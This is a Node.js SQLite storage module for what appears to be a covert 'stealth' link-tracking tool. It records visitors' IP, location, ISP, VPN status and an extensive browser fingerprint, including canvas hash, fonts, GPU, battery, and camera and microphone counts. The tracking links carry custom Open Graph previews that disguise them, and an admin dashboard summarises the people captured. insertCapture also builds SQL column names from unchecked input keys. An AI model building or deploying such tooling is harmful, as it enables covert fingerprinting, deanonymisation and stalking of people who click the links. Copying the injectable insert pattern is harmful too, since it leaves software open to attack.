const Database = require('better-sqlite3');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const dbPath = process.env.SQLITE_PATH || './data/stealth.db';
const abs = path.resolve(process.cwd(), dbPath);
fs.mkdirSync(path.dirname(abs), { recursive: true });

const db = new Database(abs);
db.pragma('journal_mode = WAL');
db.pragma('foreign_keys = ON');

function hasColumn(table, col) {
  const cols = db.prepare(`PRAGMA table_info(${table})`).all();
  return cols.some(c => c.name === col);
}

function init() {
  db.exec(`
    CREATE TABLE IF NOT EXISTS captures (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      ip TEXT, country TEXT, countryCode TEXT, region TEXT, city TEXT, zip TEXT,
      lat REAL, lon REAL, timezone TEXT, isp TEXT, org TEXT, asInfo TEXT,
      proxy INTEGER DEFAULT 0, hosting INTEGER DEFAULT 0, mobile INTEGER DEFAULT 0,
      deviceType TEXT, parsedOS TEXT, parsedBrowser TEXT, platform TEXT, vendor TEXT,
      hardwareConcurrency TEXT, deviceMemory TEXT, maxTouchPoints INTEGER,
      screenWidth INTEGER, screenHeight INTEGER, screenAvailWidth INTEGER, screenAvailHeight INTEGER,
      innerWidth INTEGER, innerHeight INTEGER, pixelRatio REAL, colorDepth INTEGER,
      orientation TEXT, darkMode TEXT, reducedMotion TEXT, connectionType TEXT, downlink TEXT, rtt TEXT,
      saveData TEXT, onLine INTEGER, batteryLevel TEXT, batteryCharging TEXT, chargingTime TEXT,
      dischargingTime TEXT, gpuVendor TEXT, gpuRenderer TEXT, maxTextureSize INTEGER, glVersion TEXT,
      canvasFingerprint TEXT, audioSampleRate INTEGER, audioChannels INTEGER, detectedFonts TEXT,
      fontCount INTEGER, adBlocker TEXT, visitCount INTEGER, firstVisit TEXT, historyLength INTEGER,
      language TEXT, languages TEXT, timezoneOffset INTEGER, localTime TEXT, referrer TEXT, currentURL TEXT,
      cameras INTEGER, microphones INTEGER, speakers INTEGER, cookiesEnabled INTEGER, doNotTrack TEXT,
      webGL INTEGER, webRTC INTEGER, localStorage INTEGER, indexedDB INTEGER, serviceWorker INTEGER,
      webAssembly INTEGER, vibration INTEGER, clipboard INTEGER, speechSynth INTEGER, notification TEXT,
      pdfViewerEnabled INTEGER, gamepad INTEGER, requestId TEXT, rawJson TEXT,
      linkId INTEGER,
      createdAt TEXT NOT NULL DEFAULT (datetime('now'))
    );
    CREATE INDEX IF NOT EXISTS idx_captures_createdAt ON captures(createdAt);
    CREATE INDEX IF NOT EXISTS idx_captures_ip ON captures(ip);
    CREATE INDEX IF NOT EXISTS idx_captures_country ON captures(country);

    CREATE TABLE IF NOT EXISTS admins (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE NOT NULL,
      passwordHash TEXT NOT NULL,
      createdAt TEXT NOT NULL DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS settings (
      key TEXT PRIMARY KEY,
      value TEXT,
      updatedAt TEXT NOT NULL DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS links (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      slug TEXT UNIQUE NOT NULL,
      name TEXT,
      redirectUrl TEXT NOT NULL,
      expiresAt TEXT,
      maxVisits INTEGER,
      visitCount INTEGER NOT NULL DEFAULT 0,
      ogTitle TEXT,
      ogDescription TEXT,
      ogImage TEXT,
      active INTEGER NOT NULL DEFAULT 1,
      createdAt TEXT NOT NULL DEFAULT (datetime('now'))
    );
    CREATE INDEX IF NOT EXISTS idx_links_slug ON links(slug);
  `);

  // migrate older DBs
  if (!hasColumn('captures', 'linkId')) {
    try { db.exec('ALTER TABLE captures ADD COLUMN linkId INTEGER'); } catch (e) {}
  }
}

function insertCapture(data) {
  const cols = Object.keys(data);
  const placeholders = cols.map(() => '?').join(',');
  const stmt = db.prepare(`INSERT INTO captures (${cols.join(',')}) VALUES (${placeholders})`);
  const info = stmt.run(...cols.map(c => data[c]));
  return info.lastInsertRowid;
}

function listCaptures({ limit = 50, offset = 0, search = '', country = '', from = '', to = '', linkId = '' } = {}) {
  let sql = 'SELECT * FROM captures WHERE 1=1';
  const params = [];
  if (search) {
    sql += ' AND (ip LIKE ? OR city LIKE ? OR country LIKE ? OR parsedBrowser LIKE ? OR parsedOS LIKE ?)';
    const q = `%${search}%`;
    params.push(q, q, q, q, q);
  }
  if (country) { sql += ' AND country = ?'; params.push(country); }
  if (from) { sql += ' AND createdAt >= ?'; params.push(from); }
  if (to) { sql += ' AND createdAt <= ?'; params.push(to); }
  if (linkId) { sql += ' AND linkId = ?'; params.push(linkId); }
  sql += ' ORDER BY id DESC LIMIT ? OFFSET ?';
  params.push(limit, offset);
  return db.prepare(sql).all(...params);
}

function countCaptures(search = '', country = '', from = '', to = '', linkId = '') {
  let sql = 'SELECT COUNT(*) as c FROM captures WHERE 1=1';
  const params = [];
  if (search) {
    sql += ' AND (ip LIKE ? OR city LIKE ? OR country LIKE ? OR parsedBrowser LIKE ? OR parsedOS LIKE ?)';
    const q = `%${search}%`;
    params.push(q, q, q, q, q);
  }
  if (country) { sql += ' AND country = ?'; params.push(country); }
  if (from) { sql += ' AND createdAt >= ?'; params.push(from); }
  if (to) { sql += ' AND createdAt <= ?'; params.push(to); }
  if (linkId) { sql += ' AND linkId = ?'; params.push(linkId); }
  return db.prepare(sql).get(...params).c;
}

function getCapture(id) { return db.prepare('SELECT * FROM captures WHERE id = ?').get(id); }
function deleteCapture(id) { return db.prepare('DELETE FROM captures WHERE id = ?').run(id); }
function clearAll() { return db.prepare('DELETE FROM captures').run(); }
function distinctCountries() {
  return db.prepare('SELECT DISTINCT country FROM captures WHERE country IS NOT NULL ORDER BY country').all().map(r => r.country);
}

function stats(linkId = '') {
  const where = linkId ? 'WHERE linkId = ?' : '';
  const p = linkId ? [linkId] : [];
  const total = db.prepare(`SELECT COUNT(*) as c FROM captures ${where}`).get(...p).c;
  const today = db.prepare(`SELECT COUNT(*) as c FROM captures ${where} ${where ? 'AND' : 'WHERE'} date(createdAt)=date('now')`).get(...p).c;
  const last24h = db.prepare(`SELECT COUNT(*) as c FROM captures ${where} ${where ? 'AND' : 'WHERE'} createdAt >= datetime('now','-1 day')`).get(...p).c;
  const uniqueIps = db.prepare(`SELECT COUNT(DISTINCT ip) as c FROM captures ${where}`).get(...p).c;
  const vpnCount = db.prepare(`SELECT COUNT(*) as c FROM captures ${where} ${where ? 'AND' : 'WHERE'} proxy=1`).get(...p).c;
  const countries = db.prepare(`SELECT country, COUNT(*) as c FROM captures ${where} GROUP BY country ORDER BY c DESC LIMIT 10`).all(...p);
  const browsers = db.prepare(`SELECT parsedBrowser, COUNT(*) as c FROM captures ${where} GROUP BY parsedBrowser ORDER BY c DESC LIMIT 10`).all(...p);
  const oses = db.prepare(`SELECT parsedOS, COUNT(*) as c FROM captures ${where} GROUP BY parsedOS ORDER BY c DESC LIMIT 10`).all(...p);
  const devices = db.prepare(`SELECT deviceType, COUNT(*) as c FROM captures ${where} GROUP BY deviceType`).all(...p);
  return { total, today, last24h, uniqueIps, vpnCount, countries, browsers, oses, devices };
}

function getAdmin(username) { return db.prepare('SELECT * FROM admins WHERE username = ?').get(username); }
function createAdmin(username, passwordHash) { return db.prepare('INSERT INTO admins (username, passwordHash) VALUES (?,?)').run(username, passwordHash); }
function countAdmins() { return db.prepare('SELECT COUNT(*) as c FROM admins').get().c; }

function getSetting(key) { const r = db.prepare('SELECT value FROM settings WHERE key=?').get(key); return r ? r.value : null; }
function setSetting(key, value) {
  db.prepare('INSERT INTO settings (key,value,updatedAt) VALUES (?,?,datetime(\'now\')) ON CONFLICT(key) DO UPDATE SET value=excluded.value, updatedAt=excluded.updatedAt').run(key, value);
}
function getAllSettings() { return db.prepare('SELECT key,value FROM settings').all(); }

// Links
function genSlug() { return crypto.randomBytes(6).toString('base64url').toLowerCase(); }
function createLink({ name, slug, redirectUrl, expiresAt, maxVisits, ogTitle, ogDescription, ogImage }) {
  let s = slug && slug.trim() ? slug.trim().toLowerCase().replace(/[^a-z0-9_-]/g, '') : '';
  if (!s) s = genSlug();
  const stmt = db.prepare('INSERT INTO links (slug,name,redirectUrl,expiresAt,maxVisits,ogTitle,ogDescription,ogImage) VALUES (?,?,?,?,?,?,?,?)');
  const info = stmt.run(s, name || null, redirectUrl, expiresAt || null, maxVisits || null, ogTitle || null, ogDescription || null, ogImage || null);
  return { id: info.lastInsertRowid, slug: s };
}
function getLinkBySlug(slug) { return db.prepare('SELECT * FROM links WHERE slug = ?').get(slug); }
function getLinkById(id) { return db.prepare('SELECT * FROM links WHERE id = ?').get(id); }
function listLinks() { return db.prepare('SELECT * FROM links ORDER BY id DESC').all(); }
function updateLink(id, fields) {
  const allowed = ['name','redirectUrl','expiresAt','maxVisits','ogTitle','ogDescription','ogImage','active'];
  const sets = []; const vals = [];
  for (const k of allowed) if (fields[k] !== undefined) { sets.push(`${k} = ?`); vals.push(fields[k]); }
  if (!sets.length) return;
  vals.push(id);
  db.prepare(`UPDATE links SET ${sets.join(',')} WHERE id = ?`).run(...vals);
}
function deleteLink(id) {
  db.prepare('DELETE FROM captures WHERE linkId = ?').run(id);
  db.prepare('DELETE FROM links WHERE id = ?').run(id);
}
function incrementLinkVisits(id) { db.prepare('UPDATE links SET visitCount = visitCount + 1 WHERE id = ?').run(id); }
function linkExpired(link) {
  if (!link || !link.active) return true;
  if (link.expiresAt && new Date(link.expiresAt) < new Date()) return true;
  if (link.maxVisits && link.visitCount >= link.maxVisits) return true;
  return false;
}

module.exports = {
  type: 'sqlite',
  init,
  insertCapture,
  listCaptures,
  countCaptures,
  getCapture,
  deleteCapture,
  clearAll,
  distinctCountries,
  stats,
  getAdmin,
  createAdmin,
  countAdmins,
  getSetting,
  setSetting,
  getAllSettings,
  genSlug,
  createLink,
  getLinkBySlug,
  getLinkById,
  listLinks,
  updateLink,
  deleteLink,
  incrementLinkVisits,
  linkExpired,
  raw: db,
};
